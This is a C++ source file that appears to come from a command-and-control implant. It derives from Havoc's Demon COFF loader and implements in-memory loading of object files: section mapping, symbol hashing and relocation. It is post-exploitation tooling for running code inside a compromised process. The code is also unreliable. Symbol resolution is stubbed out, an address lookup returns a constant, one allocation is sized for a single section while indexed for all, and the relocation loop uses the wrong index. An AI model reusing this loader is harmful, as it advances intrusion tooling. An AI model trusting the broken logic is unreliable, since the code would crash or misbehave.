#include <core/include/objects.hpp>
namespace Objects {

    UINT_PTR GetInternalAddress(uint32_t name) {
        HEXANE

        return 1;
    }

    SIZE_T GetFunctionMapSize(_executable *object) {
        HEXANE

        _symbol     *symbol         = { };
        char        *symbol_name    = { };

        char        buffer[9]       = { };
        uint32_t    n_funcs         = 0;

        for (auto i = 0; i < object->nt_head->FileHeader.NumberOfSections; i++) {
            object->section    = SECTION_HEADER(object->buffer, i);
            object->reloc      = RELOC_SECTION(object->buffer, object->section->PointerToRelocations);

            for (auto j = 0; j < object->section->NumberOfRelocations; j++) {
                symbol = &object->symbol[object->reloc->SymbolTableIndex];

                if (!symbol->First.Value[0]) {
                    symbol_name = R_CAST(char*, object->symbol + object->nt_head->FileHeader.NumberOfSymbols);

                } else {
                    x_memset(buffer, 0, sizeof(buffer));
                    x_memcpy(buffer, symbol->First.Name, 8);

                    symbol_name = buffer;
                }
                if (Utils::GetHashFromStringA(symbol_name, COFF_PREP_SYMBOL_SIZE) == COFF_PREP_SYMBOL) {
                    n_funcs++;
                }

                object->reloc = object->reloc + sizeof(_reloc);
            }
        }

        return sizeof(void*) * n_funcs;
    }

    BOOL BaseRelocation(_executable *object) {
        HEXANE

        char        symbol_name[9]  = { };
        char        *entry_name     = { };
        _symbol     *symbol         = { };
        void        *function       = { };

        bool        success         = true;
        uint32_t    count           = 0;

        for (auto i = 0; i < object->nt_head->FileHeader.NumberOfSections; i++) {
            object->section     = SECTION_HEADER(object->buffer, i);
            object->reloc       = RELOC_SECTION(object->buffer, object->section->PointerToRelocations);

            for (auto j = 0; j < object->section->NumberOfRelocations; j++) {
                symbol = &object->symbol[object->reloc->SymbolTableIndex];

                if (!symbol->First.Value[0]) {
                    entry_name = R_CAST(char*, B_PTR(object->symbol) + object->nt_head->FileHeader.NumberOfSymbols) + symbol->First.Value[1];

                } else {
                    x_memset(symbol_name, 0, sizeof(symbol_name));
                    x_memcpy(symbol_name, symbol->First.Name, 8);

                    entry_name = symbol_name;
                }

                void *target    = object->sec_map[symbol->SectionNumber - 1].address;
                void *reloc     = object->sec_map[j].address + object->reloc->VirtualAddress;
                void *fn_map    = object->fn_map + sizeof(void*) * count;

                if (!Memory::ResolveSymbol(object, entry_name, symbol->Type, &function)) {
                    success_(false);
                }

                if (function)
#ifdef _WIN64
                {
                    if (object->reloc->Type == IMAGE_REL_AMD64_REL32) {
                        *R_CAST(void**, fn_map)     = function;
                        *S_CAST(uint32_t*, reloc)   = U_PTR(function) - U_PTR(reloc) - sizeof(uint32_t);

                        count++;
                    }
                } else {
                    if (object->reloc->Type == IMAGE_REL_AMD64_REL32) {
                        *S_CAST(uint32_t*, reloc) = *S_CAST(uint32_t*, reloc) + U_PTR(target) - U_PTR(reloc) - sizeof(uint32_t);

                    } else if (object->reloc->Type == IMAGE_REL_AMD64_REL32_1) {
                        *S_CAST(uint32_t*, reloc) = *S_CAST(uint32_t*, reloc) + U_PTR(target) - U_PTR(reloc) - sizeof(uint32_t) - 1;

                    } else if (object->reloc->Type == IMAGE_REL_AMD64_REL32_2) {
                        *S_CAST(uint32_t*, reloc) = *S_CAST(uint32_t*, reloc) + U_PTR(target) - U_PTR(reloc) - sizeof(uint32_t) - 2;

                    } else if (object->reloc->Type == IMAGE_REL_AMD64_REL32_3) {
                        *S_CAST(uint32_t*, reloc) = *S_CAST(uint32_t*, reloc) + U_PTR(target) - U_PTR(reloc) - sizeof(uint32_t) - 3;

                    } else if (object->reloc->Type == IMAGE_REL_AMD64_REL32_4) {
                        *S_CAST(uint32_t*, reloc) = *S_CAST(uint32_t*, reloc) + U_PTR(target) - U_PTR(reloc) - sizeof(uint32_t) - 4;

                    } else if (object->reloc->Type == IMAGE_REL_AMD64_REL32_5) {
                        *S_CAST(uint32_t*, reloc) = *S_CAST(uint32_t*, reloc) + U_PTR(target) - U_PTR(reloc) - sizeof(uint32_t) - 5;

                    } else if (object->reloc->Type == IMAGE_REL_AMD64_ADDR32NB) {
                        *S_CAST(uint32_t*, reloc) = *S_CAST(uint32_t*, reloc) + U_PTR(target) - U_PTR(reloc) - sizeof(uint32_t);

                    } else if (object->reloc->Type == IMAGE_REL_AMD64_ADDR64) {
                        *S_CAST(uint64_t*, reloc) = *S_CAST(uint64_t*, reloc) + U_PTR(target);

                    }
                }
#else
                {
                        if (object->reloc->Type == IMAGE_REL_I386_REL32) {
                            *S_CAST(void**, fn_map)     = function;
                            *S_CAST(uint32_t*, reloc)   = U_PTR(fn_map);

                            count++;
                        }
                    } else {
                        if (object->reloc->Type == IMAGE_REL_I386_REL32) {
                            *S_CAST(uint32_t*, reloc) = *S_CAST(uint32_t*, reloc) + U_PTR(target) - U_PTR(reloc) - sizeof(uint32_t);

                        } else if (object->reloc->Type == IMAGE_REL_I386_DIR32) {
                            *S_CAST(uint32_t*, reloc) = *S_CAST(uint32_t*, reloc) + U_PTR(target);
                        }
                    }
#endif
                object->reloc = R_CAST(_reloc*, (U_PTR(object->reloc)  + sizeof(_reloc)));
            }
        }

        defer:
        return success;
    }

    BOOL ResolveSymbol(_executable *object, const char* entry_name, uint32_t type, void** function) {
        // https://github.com/HavocFramework/Havoc/blob/ea3646e055eb1612dcc956130fd632029dbf0b86/payloads/Demon/src/core/CoffeeLdr.c#L87
        HEXANE

        bool success = true;

        *function = nullptr;
        auto hash = Utils::GetHashFromStringA(entry_name, x_strlen(entry_name));

        if (!(*function = C_PTR(GetInternalAddress(hash)))){

        }
        /*
         * else if (IsImport() && !IncludesLib())
         * else if (IsImport())
         */

        defer:
        return success;
    }

    BOOL MapSections(_executable *object, const uint8_t *const data) {
        HEXANE

        uint8_t *next = { };

        object->fn_map->size    = GetFunctionMapSize(object);
        object->sec_map         = R_CAST(_object_map*, x_malloc(sizeof(_object_map)));

        x_assert(object->sec_map);

        for (auto i = 0; i < object->nt_head->FileHeader.NumberOfSections; i++) {
            object->section = SECTION_HEADER(data, i);
            object->size    += object->section->SizeOfRawData;
            object->size    = R_CAST(size_t, PAGE_ALIGN(object->size));
        }

        object->size += object->fn_map->size;

        x_ntassert(Ctx->nt.NtAllocateVirtualMemory(NtCurrentProcess(), R_CAST(void**, &object->buffer), NULL, &object->size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
        next = object->buffer;

        for (auto i = 0; i < object->nt_head->FileHeader.NumberOfSections; i++) {
            object->section             = SECTION_HEADER(object->buffer, i);
            object->sec_map[i].size     = object->section->SizeOfRawData;
            object->sec_map[i].address  = next;

            next += object->section->SizeOfRawData;
            next = PAGE_ALIGN(next);

            x_memcpy(object->sec_map[i].address, C_PTR(U_PTR(data) + object->section->PointerToRawData), object->section->SizeOfRawData);
        }

        object->fn_map = R_CAST(_object_map*, next);

        defer:
        if (ntstatus != ERROR_SUCCESS) {
            return false;
        }

        return true;
    }
}
